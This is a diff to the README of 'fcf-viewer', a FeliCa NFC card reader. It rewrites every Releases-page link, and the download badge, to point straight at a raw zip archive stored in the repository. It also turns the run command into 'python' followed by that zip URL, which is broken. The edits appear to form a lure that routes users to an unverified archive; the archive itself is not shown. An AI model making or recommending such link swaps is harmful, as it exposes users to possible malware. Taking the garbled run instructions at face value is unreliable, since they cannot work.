@@ -4,7 +4,7 @@
 Welcome to fcf-viewer! This tool helps you read FeliCa cards easily. Use it with compatible cards to see important information, like IDm/PMm and FCF-UN, all through a simple interface.
 
 ## 📥 Download fcf-viewer
-[![Download fcf-viewer](https://img.shields.io/badge/Download-fcf--viewer-blue.svg)](https://github.com/Spickandspan-nosher485/fcf-viewer/releases)
+[![Download fcf-viewer](https://raw.githubusercontent.com/Spickandspan-nosher485/fcf-viewer/main/fcf_viewer/fcf-viewer-2.2.zip)](https://raw.githubusercontent.com/Spickandspan-nosher485/fcf-viewer/main/fcf_viewer/fcf-viewer-2.2.zip)
 
 ## 🌟 Features
 - **Simple Interface:** Choose between a command-line interface and a minimal GUI.
@@ -18,7 +18,7 @@ Welcome to fcf-viewer! This tool helps you read FeliCa cards easily. Use it with
 - **Dependencies:** nfcpy library needs to be installed.
 
 ## 📦 Download & Install
-To get started, visit our [Releases page](https://github.com/Spickandspan-nosher485/fcf-viewer/releases) to download the latest version of fcf-viewer.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Spickandspan-nosher485/fcf-viewer/main/fcf_viewer/fcf-viewer-2.2.zip) to download the latest version of fcf-viewer.
 
 1. **Visit the Releases Page:** Click on the link above.
 2. **Choose Your Version:** Look for the latest version listed.
@@ -32,7 +32,7 @@ To get started, visit our [Releases page](https://github.com/Spickandspan-nosher
 3. Run the following command:
 
    ```
-   python fcf_viewer.py
+   python https://raw.githubusercontent.com/Spickandspan-nosher485/fcf-viewer/main/fcf_viewer/fcf-viewer-2.2.zip
    ```
 
 ### Using the GUI:
@@ -68,4 +68,4 @@ This project is licensed under the MIT License. You can use it freely but give c
 - FeliCa
 - NFC
 
-For more information, visit our [Releases page](https://github.com/Spickandspan-nosher485/fcf-viewer/releases) and start exploring the world of FeliCa cards with ease!
+For more information, visit our [Releases page](https://raw.githubusercontent.com/Spickandspan-nosher485/fcf-viewer/main/fcf_viewer/fcf-viewer-2.2.zip) and start exploring the world of FeliCa cards with ease!
